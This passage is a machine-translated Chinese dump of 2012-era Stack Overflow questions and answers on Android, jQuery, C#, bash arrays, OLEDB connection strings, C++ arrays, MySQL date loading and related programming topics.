我知道它无法恢复，所以我从市场上取消了我的 apk 并上传了新的，但我仍然遇到同样的错误。此错误的原因可能是什么，我已从市场上取消发布该 apk。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:11:45.543

您必须更改新应用程序的 Java 包名称。

两个不同的应用程序（具有两个不同的签名密钥）不能共享相同的包名称。

# jquery - 最接近的 td 值

> ID：10102133
> 
> 赞同：0
> 
> 时间：2012-04-11T08:05:47.217
> 
> 标签：jquery

我有一张桌子：

```
<table>
<thead>
    <tr>
        <td>some1</td>
          ......
        <td>some2</td>
        <th>count</th>
        <th>EditCount</th>
    </tr>
</thead>
<tbody>
    <tr>
        <td>some1</td>
          ......
        <td>some2</td>
        <td>25</td>
        <td><input type='text' value='1'/></td>
   </tr>
   <tr>
        <td>some1</td>
          ......
        <td>some2</td>
        <td>35</td>
        <td><input type='text' value='3'/></td>
   </tr> 
```

如何从每一行的输入中获取左侧的 td 值，例如当用户单击此输入时？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:08:58.713

（注意“左侧”，我认为这是第一个，`td`即最左边的一个）

试试这个 ：

```
$('input[type=text]' ).change(function() {
  var firsttd = $('td:first', $(this).parents('tr'));
}); 
```

在 jQuery 中使用[.change()](http://api.jquery.com/change/)方法（这可能是`focus`等`blur`）。使用选择器`td:first`获取第一个`td`并将上下文设置为当前对象（`input') parent`tr`

[这里的工作示例](http://jsfiddle.net/3tkyW/)

## 更新

要获得前一个`td`（即使用值`25`或`35`使用：

```
$('input[type=text]' ).change(function() {
  var prevtd = $(this).parent('td').prev('td');
}); 
```

这得到[.parent()](http://api.jquery.com/parent/) `td`然后是[.prev()](http://api.jquery.com/prev/) `td`

[这里的工作示例](http://jsfiddle.net/3tkyW/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:12:47.133

或者..像这样的东西

```
$('table input').click(function() {
    $(this).parent().css('border','1px solid #f00');
}); 
```

虽然我会用课程或其他东西对选择的人进行个性化，所以这并不常见

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:13:33.470

添加一个类，让假设'值'到所有左侧 tds 然后在输入上添加另一个类调用此函数

```
<script type = 'text/javascript'>
$('.button_class').click(function(){
        var myvalue = $(this).parent().children().attr(value);
}); 
```

这将自动选择第一个孩子，或者你也可以使用它

```
var myvalue = $(this).parent().eq(0).attr(value); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:13:52.810

你习惯使用 jQuery 吗？如果是这样，那么您可以使用 jQuery 中的 prev() 函数来获取前一个兄弟（在这种情况下是前一个 td）

阅读：[http ://api.jquery.com/prev/](http://api.jquery.com/prev/)

# c# - 通用函数问题 - 无法将类型“System.Web.UI.Control”转换为“T”

> ID：10102134
> 
> 赞同：0
> 
> 时间：2012-04-11T08:05:55.433
> 
> 标签：c#, asp.net

看来我仍然没有“获得”泛型......我想要一个通用函数来加载一个固有地调用 Page.LoadControl() 的用户控件，但是在尝试使其工作时出现上述错误。

这是我用来加载控件的代码模型：

```
MyControl Ctrl = MyUtilClass.LoadControl(Page, "MyControl"); 
```

然后在 MyUtilClass 中：

```
internal static T LoadControl<T>(Page P, string ControlName)
{
    return (T)P.LoadControl(String.Format("~/{0}{1}.ascx", WebGlobals.cControlDir, ControlName));
} 
```

我显然做错了，但我的理解是编译器会查看我试图将此函数的结果分配给的 var 类型，并能够将结果转换为该类型。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:13:46.073

你不需要泛型。只需让您的方法返回`Control`：

```
internal static System.Web.UI.Control LoadControl(Page P, string ControlName)
{
    return P.LoadControl(String.Format("~/{0}{1}.ascx", WebGlobals.cControlDir,
                                                        ControlName));
} 
```

如果你把这个方法放在一个静态类中，你可以用它做一个扩展方法，注意方法`this`的第一个参数之前：

```
internal static System.Web.UI.Control LoadControl(this Page P, string ControlName)
{
    return P.LoadControl(String.Format("~/{0}{1}.ascx", WebGlobals.cControlDir, 
                                                        ControlName));
} 
```

你现在可以这样称呼它：

```
var control = yourPage.LoadControl(controlName); 
```

* * *

如果您真的想要一个`MyControl`实例，请将方法更改为：

```
internal static MyControl LoadControl(this Page P, string ControlName)
{
    return (MyControl)P.LoadControl(String.Format("~/{0}{1}.ascx", 
                                    WebGlobals.cControlDir, 
                                    ControlName));
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:11:31.140

我认为您只需要将通用函数限制为`Control`s，否则`T`对于您的目的来说太通用了。

```
internal static T LoadControl<T>(Page P, string ControlName)
    where T : System.Web.UI.Control
{
    ...
} 
```

**编辑**

您可以这样做，但我不确定是否值得在[Daniel Hilgarth 的回答](https://stackoverflow.com/a/10102243/659190)中比非通用方法增加额外的复杂性。

```
internal static void LoadControl<T>(Page P, 
                                     string ControlName
                                     out T control)
    where T : System.Web.UI.Control
{
    control = (T)P.LoadControl(
                   String.Format("~/{0}{1}.ascx",
                                    WebGlobals.cControlDir, 
                                    ControlName));
} 
```

像这样打电话

```
MyControl myControl;
LoadControl(page, "MyControl", myControl); 
```

# xcode - 为开发人员使用 geoloqi，geoloqi 团队是否可以使用我的应用程序代码？

> ID：10102135
> 
> 赞同：0
> 
> 时间：2012-04-11T08:05:59.713
> 
> 标签：xcode, geolocation

我想为开发者使用实时位置跟踪 geoloqi 平台，我在 geoloqi 网站上没有找到任何关于开发者应用程序代码隐私的声明。我想确保我的应用程序代码隐私得到保护，并且包括 geoloqi 开发团队在内的任何人都无法使用该代码。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T05:30:00.200

不，您的应用程序的源代码对 Geoloqi 团队是不可见的。您可以自由创建使用我们的 SDK 和 API 的闭源应用程序，而无需与任何人共享源代码。

# linux - bash中间接引用数组的访问范围

> ID：10102140
> 
> 赞同：0
> 
> 时间：2012-04-11T08:06:19.290
> 
> 标签：linux, arrays, bash, reference, queue

我有一个 bash 脚本，需要构建一些集合，每个集合包含来自多个队列的 1 个元素（我正在考虑使用数组来存储这些）例如，如果我有以下队列：

```
array1=(a b c e f)                                                            
array2=(x y z)                                                                
array3=(1 2 3 4) 
```

我需要获得以下数组（不一定一次全部，我一次处理一个结果数组）

```
斧头 1
2
cz 3
4
F

```

数组的数量是动态的。

所以基本上我需要从每个数组中弹出第一个元素并放入另一个数组。我知道我可以像这样从数组中弹出第一个元素：

```
 el1=${array1[0]}
 array1=(${array1[@]:1:$((${#array1[@]}))}) 
```

另外，我知道我可以从间接引用的数组中提取一个值，如下所示：

```
val=$(eval echo \${$arr[0]}) 
```

**我的问题是：如何重写从数组中弹出第一个元素的部分以使用间接引用。**

这是完整的测试脚本：

```
#!/bin/bash

set -e 
set -u

array1=(a b c e f)
array2=(x y z)
array3=(1 2 3 4)

finished=false
while ! $finished; do
   finished=true

   array4=()
   for arr in array1 array2 array3; do
      val=$(eval echo \${$arr[0]})
      if [ ! -z $val ]; then
         array4=(${array4[@]} $val)
         $arr=(\${$arr[@]:1:$((\${#$arr[@]}))})
      fi
   done

   l4=${#array4[@]}
   if [ $l4 -gt 0 ]; then
      finished=false

      for i in ${array4[@]}; do
         echo $i
      done
   fi

done 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:06:36.960

```
array1=(a b c e f )                                                            
array2=(x y z)                                                                
array3=(1 2 3 4)

cnt=0
while : ; do
  line=''
  for a in ${!array*}; do               # loop over names "array*"
    val=$(eval echo \${$a[$cnt]} )
    line="$line ${val:- }"              # build line
  done
  ((cnt++))
  [[ $line =~ ^\ +$ ]] && break         # break if line has only blanks
  echo -e "${line:1}"
done 
```

输出：

```
a x 1
b y 2
c z 3
e   4
f 
```

# c# - 是否可以将列表定义为更像数组？

> ID：10102142
> 
> 赞同：1
> 
> 时间：2012-04-11T08:06:27.857
> 
> 标签：c#, arrays, winforms, list

我想知道您是否可以以类似的格式定义列表：

```
List<int> blah = [5,7,8]; 
```

我已经尝试过了，但没有用，但是有类似的方法吗？我想这样做的原因是因为我正在制作一个以 List< List< string>> 作为参数的方法，并且我希望能够做到这一点：

```
DoSomething( [ [1,2,3] , [1,2,3] , [1,2,3] ] ); 
```

而不是这样做：

```
List<List<string>> foo = new List<List<string>>();
//add each of the "[1,2,3]"s here
DoSomething(foo); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T08:08:58.697

你可以这样做：

```
List<int> blah = new List<int> { 5,7,8 };

DoSomething(new List<List<int>> { new List<int> { 1,2,3 },
                                  new List<int> { 1,2,3 },
                                  new List<int> { 1,2,3 } } ); 
```

它被称为[集合初始化器](http://msdn.microsoft.com/en-us/library/bb384062.aspx)。

# asp.net - asp.net ajax 控制工具包滑块

> ID：10102148
> 
> 赞同：0
> 
> 时间：2012-04-11T08:06:37.650
> 
> 标签：asp.net, asp.net-ajax, ajaxcontroltoolkit

我正在使用 ajax controltoolkit 滑块我想将滑块限制在一定范围内。

Fr ex：我的滑块最小值为 0，最大值为 10000，但我只能滚动到 7000，我的滑块必须从 0 移动到 7000，但范围栏必须为 10000。有什么办法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:24:25.053

滑块有一个名为 OnClientDrag 的事件，您可以做的是创建一个 jquery/javascript 函数，该函数将在更改时检查值，当它达到 7000 时，您可以通过 jquery 方法取消事件，这样的事情可能会有所帮助：

```
<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>Untitled Page</title>
</head>
<body>
    <form id="form1" runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server">
        </asp:ScriptManager>
        <asp:TextBox ID="Slider1" runat="server" AutoPostBack="false" style="right:0px" Text="0"/>
        <ajaxToolkit:SliderExtender ID="SliderExtender1" runat="server"
            BehaviorID="Slider1"
            TargetControlID="Slider1"
            Minimum="-100"
            Maximum="100"
            BoundControlID="Slider1_BoundControl"
            Steps="5" />

        <input id="btnDisable" type="button" value="Disable" onclick="disableSlider()"/>
        <input id="btnEnable" type="button" value="Enable" onclick="enableSlider()" disabled="true"/>
        <script type="text/javascript" language="javascript">
            function disableSlider(){
                 $clearHandlers($find('Slider1')._handle);
                 $clearHandlers($find('Slider1')._railElement);
                 $get('btnDisable').disabled = true;
                 $get('btnEnable').disabled = false;
            }
            function enableSlider(){
                 $addHandlers($find('Slider1')._handle, 
                    {
                        'mousedown': $find('Slider1')._onMouseDown,
                        'dragstart': $find('Slider1')._IEDragDropHandler,
                        'drag': $find('Slider1')._IEDragDropHandler,
                        'dragend': $find('Slider1')._IEDragDropHandler
                    },
                    $find('Slider1'));

                $addHandlers($find('Slider1')._railElement,
                    {
                        'click': $find('Slider1')._onRailClick
                    },
                    $find('Slider1'));
                $get('btnDisable').disabled = false;
                $get('btnEnable').disabled = true;
            }
        </script>
    </form>
</body>
</html> 
```

# c# - OLEDB 连接字符串中的 IMEX 是什么？

> ID：10102149
> 
> 赞同：35
> 
> 时间：2012-04-11T08:06:39.040
> 
> 标签：c#, connection-string, oledb

`"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=localhost;Extended Properties=""Excel 8.0;HDR=Yes;IMEX=2"`

`IMEX=2`上述连接字符串的目的是什么？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-04-11T08:10:39.533

从[连接字符串](http://connectionstrings.com/excel-2007)

> “如果要将列标题读入结果集中（即使有标题也使用 HDR=NO）并且列数据是数字，请使用 IMEX=1 以避免崩溃。
> 
> 始终使用 IMEX=1 是检索混合数据列数据的更安全方法。..”

请注意，当您需要将数据写回 Excel 时，IMEX 值可能非常重要。在互联网上快速搜索 IMEX 发现了许多关于各种 IMEX 值问题的文章

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2015-12-13T02:36:28.230

使用 OleDbConnection 读取 Excel 文件时存在潜在问题。

如果你使用

```
 "Extended Properties='Excel 8.0;HDR=NO;IMEX=3;'" 
```

对于像下面这样的列，其中前 8 行有 4 个（或更多）数值，则类型被认为是数值，字符串值被读取为 null。

请注意，此处未将标头用作标头（HDR = NO），因此“邮政编码”行是第一行。（这些邮政编码来自瑞典，以防您不认识它们的格式。）

```
 1) zipcode
 2) 125 45
 3) 115 50
 4) 18735
 5) 11335
 6) 13940
 7) 181 55
 8) 11759
 9) 176 74
10) 137 38 
```

但是如果您的数据看起来像这样，前 8 行中只有 3 个是数字

```
 1) zipcode
 2) 125 45
 3) 115 50
 4) 18735
 5) 11335
 6) 139 40 <-- This one changed so that it is a string
 7) 181 55
 8) 11759
 9) 176 74
10) 137 38 
```

然后它可以工作，它会以字符串的形式读取所有内容。

所以第一种情况是有问题的。但是有一个解决方案。

假设您使用

```
 "Extended Properties='Excel 8.0;HDR=YES;IMEX=1;'" 
```

我们已将 IMEX 更改为 1 并将 HDR 更改为 YES，那么它将在上述两种情况下将数据读取为字符串。但是假设我们有这样的数据

```
 1) zipcode
 2) 12545
 3) 11550
 4) 18735
 5) 11335
 6) 13940
 7) 18155
 8) 11759
 9) 17674
10) 137 38 
```

那么前 8 个数据行都是数字的，然后它再次失败，即使我们有 IMEX=1。

您可以通过以下方式解决此问题。将连接字符串更改为此

```
 "Extended Properties='Excel 8.0;HDR=NO;IMEX=1;'" 
```

请注意，我们保持 IMEX=1，但将 HDR 改回 NO。

现在第 1 行不再被视为标题，“zipcode”被读取为数据，并且由于它显然是一个字符串，所有行都被读取为字符串（这就是 IMEX=1 的工作方式）。

这种方法有几个缺点。两者都可以解决：

1.  您不能按列的名称（邮政编码）引用列，但需要根据列所在的位置使用例如 F7。

> 您可以通过找出 zipcode 列的位置来解决这个问题（可以通过编程方式完成）并通过将“zipcode”更改为例如“F7”来相应地更改 SQL 文本。

2.  值“zipcode”将出现在您的数据中。

> 这可以通过在 where 子句中使用 F7<>'zipcode' 来解决。有人可能会认为这会抵消我们包含邮政编码（作为字符串）以确保所有行都被视为字符串的事实。在对此进行测试之后，结果发现排除“邮政编码”的 where 子句技巧没有这种抵消作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-20T14:48:27.323

当您将excel文件读入数据表时，数据表会读取列值，大约8-10条记录后，它将为列分配数据类型。例如，如果列值为
11.0
22.0
33.0
44.0
55.0
66.0
77.0
88.0
99.0
abc
因此，数据表将没有值 abc，因为该列已被分配数据类型“Double”。为避免这种情况，使用 IMEX = 1 读取完整数据。
请评论进一步查询。

* * *

## 回答 #4

> 赞同：-8
> 
> 时间：2015-10-12T17:59:00.530

请在模块中使用通用函数...

```
Public Function DeleteBlankRowsfromDataset(ByRef Dtset As DataSet) As Boolean
    Try
        Dtset.Tables(0).AsEnumerable().Where(Function(row) row.ItemArray.All(Function(field) field Is Nothing Or field Is DBNull.Value Or field.Equals(""))).ToList().ForEach(Sub(row) row.Delete())
        Dtset.Tables(0).AcceptChanges()
        DeleteBlankRowsfromDataset = True
    Catch ex As Exception
        MsgBox("Deleting Blank Records in Dataset Failed")
        DeleteBlankRowsfromDataset = False
    End Try

End Function 
```

# java - this 和 Activity.this 有什么区别

> ID：10102151
> 
> 赞同：29
> 
> 时间：2012-04-11T08:06:43.923
> 
> 标签：java, android, syntax, android-activity, this

例如

```
Intent intent = new Intent(this, SecondActivity.class); 
```

> eclipse错误：Intent类型中的方法setClass（Context，Class）不适用于参数（FirstActivity.ClickEvent，Class）

```
Intent intent = new Intent(FirstActivity.this, SecondActivity.class); 
```

但这将是正确的。任何人都可以解释这两者之间的区别吗？谢谢。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-04-11T08:12:02.923

`this`指您当前的对象。在您的情况下，您必须在内部类 ClickEvent 中实现了意图，这就是它所指向的。

`Activity.this`指向您当前所在的 Activity 实例。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2019-03-13T12:52:52.493

Shubhayu 的回答是正确的，但我只想向任何看到这个问题的人说明这一点`this`，如果您**直接在活动**`Activity.this`中使用它也是**一样**的。

 **[这是回答here](https://stackoverflow.com/questions/5666134/what-is-the-difference-between-class-this-and-this-in-java)

例子：

```
@Override
protected void onResume() {
    super.onResume();

    Log.d("Test", this.toString());
    Log.d("Test", MainActivity.this.toString());
} 
```

结果：

```
D/Test: com.example.app.MainActivity@e923587
D/Test: com.example.app.MainActivity@e923587 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T08:09:14.403

当您指向此内部点击事件时，它指向点击侦听器。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-11T08:11:44.807

您打算将控制权从一个活动转移到另一个活动，为此您必须基本上指定一个事件，因此会出现错误。这意味着整个活动和第一个活动。这意味着发生事件，例如单击按钮......**

# java - 收到多个数据包的 StreamCorruptedException

> ID：10102152
> 
> 赞同：0
> 
> 时间：2012-04-11T08:06:46.280
> 
> 标签：java, serialization, nio

我有一个客户端服务器应用程序，我在其中使用带有 java.nio 选择器工具的 java serversocket（服务器端）和套接字（客户端）。我通过 ObjectInput/Output Streams 使用序列化对象在客户端和服务器之间交换消息。

这是用于从服务器接收消息的 scala 代码，这是相当标准的

```
enter code here

var msg:CommunicationMessage = null
    var buf:ByteBuffer  = ByteBuffer.allocate(1024);
    var numBytesRead:Int = 0

    try {
        // Clear the buffer and read bytes from socket
        buf.clear();
        //println("Before Read")

        numBytesRead = sChannel.read(buf)

        //println("After Read  " + numBytesRead)

        numBytesRead match {

          case -1 => 
            println("Something Wrong with the Channel")

          case 0 => 
            //println("Nothing to read")

          case _ =>
            //println("Read some bytes")
            // To read the bytes, flip the buffer
            buf.flip();

            // Read the bytes from the buffer ...;
            // see Getting Bytes from a ByteBuffer
            val bis:ByteArrayInputStream = new ByteArrayInputStream (buf.array());
            val ois:ObjectInputStream = new ObjectInputStream (bis);
            msg = ois.readObject().asInstanceOf[CommunicationMessage];

            println("\n\n")
            println("Received Message from Server")

            msg.msgType match {

                case CommunicationConstants.COMM_MSG_TYPE_RSP =>
                    println("updating server info")
                    updateServerInfo(msg.msgData)

                case CommunicationConstants.COMM_MSG_TYPE_IND =>
                    if (serverAccepted) updateClientUI(msg)

            }

        }

    } catch  {

      case e:StreamCorruptedException =>
        println("Stream Corruption Exception received " + e.getCause())

      case e:IOException => 
        // Connection may have been closed
        println("IO Exception received" + e.getCause())
    }
enter code here 
```

一切正常，除了服务器在很短的时间内写入多条消息并且客户端在缓冲区中一起接收它们并导致 StreamCorruptedException 的情况。据我了解，objectinputstream 无法在传入字节流中的多个序列化对象之间定界，因此会引发此无效流错误。此外，即使我已经为捕获它设置了异常，程序仍然挂起。

有什么办法可以解决这个问题。?

1）根据一些长度字段在消息中创建我自己的分隔符来标识消息边界。

2）我还在某处阅读以在每次接收后关闭套接字并开始一个新的。不知道这将如何帮助。

请建议。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T01:44:41.847

您需要在`ObjectOutputStream`其内容之前发送打包的长度。然后您确切地知道有多少传入数据属于每个流，并且您可以相应地构建您的`ByteArrayInputStream`数据。

# c# - 如何使具有二维数组的 COM 对象中的函数在 Agilent VEE 中可见？

> ID：10102155
> 
> 赞同：0
> 
> 时间：2012-04-11T08:06:56.450
> 
> 标签：c#, arrays, com

我有一个 COM 对象（C#，Visual Studio），它的函数将二维数组作为 in 参数。当我想通过 Agilent VEE 访问此功能时，在功能和对象浏览器中不可见，并且无法访问。如果我将数组更改为单维，则立即变为可见。

我听说 VEE 不适合处理二维数组，但应该有一个解决方法。

任何人都知道如何使用 vee 可见的二维数组制作 com 对象？最好的问候， AK

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T11:11:02.670

COM 自动化支持 SafeArray 作为数组的包装类型。COM 的 CLR 互操作层自动从 C# 数组类型生成它们。但它们等价于多维数组，而不是锯齿状数组。数组数组没有等效的自动化类型，它们将作为变体的一维数组公开，其中每个变体都是一个数组。

足以使 COM 客户端绊倒，也许语法变得很复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:36:05.330

好的，当然是在发布问题两分钟后找到的。我将我的数组声明为锯齿状数组，

`int [][] array = new [][];`并将其更改为`int[,] array = new int [,];`

现在它起作用了！

# php - 带有子数组的php usort

> ID：10102158
> 
> 赞同：0
> 
> 时间：2012-04-11T08:07:14.777
> 
> 标签：php, usort

我正在尝试使用 usort 对数组进行排序，但它不起作用，我做错了什么？

```
$tmp = array();
$tmp[] = array(
  'x' => 0.000123
);
$tmp[] = array(
  'x' => 0.000120
);
$tmp[] = array(
  'x' => 0.000333
);

usort($tmp, function ($a, $b) {
  return $b['x'] - $a['x'];
});

print_r($tmp); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:21:03.757

```
$tmp = array();
$tmp[] = array(
    'x' => 0.000123
);
$tmp[] = array(
    'x' => 0.000120
);
$tmp[] = array(
    'x' => 0.000333
);

usort($tmp, function ($a, $b) {
    $a = $a['x'];
    $b = $b['x'];
    if ($a == $b) {
        return 0;
    }
    return ($a < $b) ? -1 : 1;
}); 
```

试试这个

# c++ - 在 C++ 中修改数组的长度

> ID：10102159
> 
> 赞同：3
> 
> 时间：2012-04-11T08:07:15.977
> 
> 标签：c++

如果我有这个浮点数组声明：

```
float tables[10]; 
```

如何将“表”数组的长度更改为 20？

另一个与 C++ 中的数组有关的问题：

我不能像这样声明一个数组：

```
int length=10;

float newTables[length]; // error C2133: 'newTables' : unknown size 
```

提前致谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-11T08:09:01.313

您不能更改数组的长度。在 C++ 中，您应该使用一个`std::vector`for 动态数组：

```
#include <vector>

int main() {
    std::vector::size_type length = 10;
    std::vector<float> tables(length); // create vector with 10 elements
    tables.resize(20); // resize to 20 elemets
    tables[15] = 12; // set element at index 15 to value 12
    float x = tables[5]; // retrieve value at index 5
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:12:32.450

如果您可以在构建时定义数组的大小，则可以使用 #define

```
#DEFINE ARRAY_SIZE 20
float tables[ARRAY_SIZE]; 
```

或者如果您需要在运行时指定数组的大小，请使用 new

```
float* newtables;
newtables = new float[20]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:13:18.770

C++ 中的数组具有固定长度。如果你想坚持使用纯数组，你需要使用[malloc、realloc 和 free](http://linux.die.net/man/3/malloc)动态分配内存。但是，您应该更喜欢[std::vector](http://en.cppreference.com/w/cpp/container/vector)或[std::deque](http://en.cppreference.com/w/cpp/container/deque)进行动态内存分配。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:17:38.007

在 C++ 中运行程序时，您不能动态地更改数组的长度。关于您要声明数组的方式，我建议您执行以下操作：

```
const int length=10;
float newTables[length]; 
```

我不确定这是否是你想要的。在这种情况下，变量“length”是一个常数，在执行过程中不能改变。

我希望它对你有帮助。

# c# - 如何在 ASP.Net 中将 word 转换为 pdf

> ID：10102160
> 
> 赞同：2
> 
> 时间：2012-04-11T08:07:27.647
> 
> 标签：c#, asp.net, pdf

我有一个问题，也许这有点荒谬。我想在我的 ASP.Net 项目中制作一个用户可以将 word 文档转换为 PDF 的设备。是否有任何编程解决方案？

或者没有任何代码示例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:33:34.623

DevExpress 有能力做到这一点。请参阅[此处](http://www.devexpress.com/Products/NET/Controls/WinForms/Rich_Editor/)，文档服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T18:40:19.577

将 Word 文档转换为 PDF 有点棘手。我过去所做的是投资于第三方解决方案 ( [ActivePDF](http://www.activepdf.com/products/serverproducts/docconverter/Overview.cfm?CFID=6403860&CFTOKEN=68839519&jsessionid=96301479491334428681797) ) 并围绕它编写了一个服务，可供需要文档转换工具的应用程序使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T18:45:10.163

要从 Word 文档（DOC 和 DOCX）创建 PDF，您需要使用一个库（全是商业的，因为我不知道有任何免费的库处理 DOC/DOCX 和 PDF）：

*   [Aspose.Words](http://www.aspose.com/categories/.net-components/aspose.words-for-.net/default.aspx)
*   [Gembox.Documents](http://www.gemboxsoftware.com/document/overview)

顺便提一句：

有几个库（免费和商业）来处理 Office 文件（没有 Office Interop）。

MS 提供免费的 OpenXML SDK V 2.0（不能创建 PDF！） - 请参阅[http://msdn.microsoft.com/en-us/library/bb448854%28office.14%29.aspx](http://msdn.microsoft.com/en-us/library/bb448854%28office.14%29.aspx)（仅像 DOCX 这样的新格式, XLSX 等）。

MS 不支持在服务器方案（如 ASP.NET、Windows 服务等）中使用 Office 互操作 - 请参阅[http://support.microsoft.com/default.aspx?scid=kb;EN-US;q257757# KB2](http://support.microsoft.com/default.aspx?scid=kb;EN-US;q257757#kb2)

此外，自 Windows Vista 以来已经发生了一些与安全相关的更改，这基本上使得在 Windows 服务中做任何“类似桌面”的事情变得非常困难（IIS/ASP.NET 在这方面只是 Windows 服务的一个特例）。

# javascript - 使用 Forge 访问浏览器证书

> ID：10102163
> 
> 赞同：4
> 
> 时间：2012-04-11T08:07:41.023
> 
> 标签：javascript, security, pki

我们正在开发一个使用 PKI 的安全应用程序。作为要求的一部分，我们需要构建一个独立于浏览器和平台的应用程序，它支持浏览器和 eToken 中的所有类型的证书。我们将这些证书用于加密和解密目的。所有与 PKI 相关的工作都应该发生在客户端。

我发现了一个名为 Forge [https://github.com/digitalbazaar/forge/downloads](https://github.com/digitalbazaar/forge/downloads)的 JavaScript 库。

a) 使用 forge 从浏览器获取证书列表并访问 b) 获取证书的公共信息 c) 获取用于加密数据的私钥

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-28T15:15:46.643

目前，浏览器中没有用于访问证书的 JS API。您通常可以将它们导出到 Forge 可以读取的 PKCS#12 (p12) 文件。请记住，用户绝对不希望服务器访问他们的私钥（也可以导出到 PKCS#12 容器）。

如果您确实需要访问 JS 中的私钥并且您无权访问 WebCrypto API（大多数浏览器还没有，因为它不完整），您将不得不降低安全性。也就是说，服务器将能够访问用户的私钥——他们应该知道这一点。为此应生成新的密钥对；不应重复使用用户可能在其他地方使用的现有的。将来，JS 应该可以访问使用私钥的加密函数——而不会将密钥材料暴露给浏览器（保护它不受服务器影响）。在那之前，如果你必须使用 JS，唯一的选择是让用户在某种程度上信任服务器。Forge 可用于生成密钥对、创建证书、创建 p12s 等。

# mysql - LOAD DATA INFILE 轻松将 YYYYMMDD 转换为 YYYY-MM-DD？

> ID：10102167
> 
> 赞同：11
> 
> 时间：2012-04-11T08:08:00.970
> 
> 标签：mysql

嗨，我有一个要导入的 INFILE，但日期的格式为：

```
AADR,20120403,31.43,31.43,31.4,31.4,1100
AAU,20120403,2.64,2.65,2.56,2.65,85700
AAVX,20120403,162.49,162.49,154.24,156.65,2200 
```

有没有什么简单的方法可以将日期转换为“2012-04-03”，而不必先用 perl 脚本打开它，转换日期，然后再写回文件？

蒂亚！！

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-04-11T08:48:26.350

这一步加载和转换，不需要另一个表。有关详细信息，请参阅[手册](http://dev.mysql.com/doc/refman/5.1/en/load-data.html)。

```
LOAD DATA INFILE 'file.txt'
INTO TABLE t1
FIELDS TERMINATED BY ',' 
(column1, @var1, column3, ...)
SET column2 = STR_TO_DATE(@var1,'%Y%m%d') 
```

# android - BaseAdapter 中 Cursor 上的 nulPointer 错误，日志输出显示不为空

> ID：10102168
> 
> 赞同：1
> 
> 时间：2012-04-11T08:08:02.810
> 
> 标签：android, cursor, nullpointerexception

正如您在下面的 logcat 中看到的，我得到一个 nullPointer，它指出错误在这一行（来自下面的 onClick 方法）： text.setText(cur.getString(0));

LogCat "Seek out a Space Phenomenon" 的第四行是我将 cur.getString(0) 输出到 Log ......所以根据我的说法，没有空指针，但当然我可能错了。谁能告诉我我的方式的错误？

```
public class QuestsAdapter extends BaseAdapter implements OnClickListener {

    public Activity activity;
    private static LayoutInflater inflater=null;
    Cursor c;
    User player;

    public QuestsAdapter(Activity a, Cursor cur, User u) {
        activity = a;
        player = u;
        c = cur;
        c.moveToFirst();
        inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    public int getCount() {
        return c.getCount();
    }

    public Object getItem(int position) {
        return position;
    }

    public long getItemId(int position) {
        return position;
    }

    public static class ViewHolder{
        public TextView title;
        public TextView credits;
        public TextView xp;
        public TextView loot;
        public Button engage;
        //public ProgressBar prog;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        View vi=convertView;
        ViewHolder holder;
        if(convertView==null){
            vi = inflater.inflate(R.layout.quest_list, null);
            holder=new ViewHolder();
            holder.title=(TextView)vi.findViewById(R.id.questTitle);
            holder.credits=(TextView)vi.findViewById(R.id.questCredits);
            holder.xp=(TextView)vi.findViewById(R.id.questXP);
            holder.loot=(TextView)vi.findViewById(R.id.questLoot);
            holder.engage = (Button) vi.findViewById(R.id.questButton);
            vi.setTag(holder);
        }
        else
            holder=(ViewHolder)vi.getTag();
        c.moveToPosition(position);
        holder.title.setText(c.getString(1));
        holder.credits.setText(NumberFormat.getInstance().format(c.getInt(2)) + " - " +
                NumberFormat.getInstance().format(c.getInt(3)) + "UC");
        holder.xp.setText("Exp: +" + c.getString(4));
        holder.loot.setText("Loot: " + c.getString(8));
        holder.engage.setId(c.getInt(0));
        holder.engage.setOnClickListener(this);
        return vi;
    }

    @Override
    public void onClick(View v) {
        DBAdapter db = new DBAdapter(activity);
        db.open(false);
        final Cursor cur = db.getQuest(v.getId());
        cur.moveToFirst();
